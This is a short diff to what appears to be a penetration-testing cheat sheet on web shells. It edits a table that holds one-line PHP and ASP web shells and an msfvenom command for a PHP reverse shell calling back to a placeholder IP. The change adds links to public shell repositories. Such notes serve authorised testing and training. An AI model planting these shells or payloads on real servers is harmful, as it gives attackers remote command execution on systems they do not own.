@@ -19,6 +19,6 @@ To test if we can abuse php site with a webshell we can save a file with this to
 |\<?php system($_REQUEST['cmd']); ?> |	Basic PHP Web Shell|
 |\<% eval request('cmd') %> |	Basic ASP Web Shell|
 |msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php 	|Generate PHP reverse shell|
-|PHP Web Shell| 	PHP Web Shell|
-|PHP Reverse Shell |	PHP Reverse Shell|
-|Web/Reverse Shells |	List of Web Shells and Reverse Shells|
+|[PHP Web Shell](https://github.com/Arrexel/phpbash)| 	PHP Web Shell|
+|[PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell) |	PHP Reverse Shell|
+|[Web/Reverse Shells](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) |	List of Web Shells and Reverse Shells|
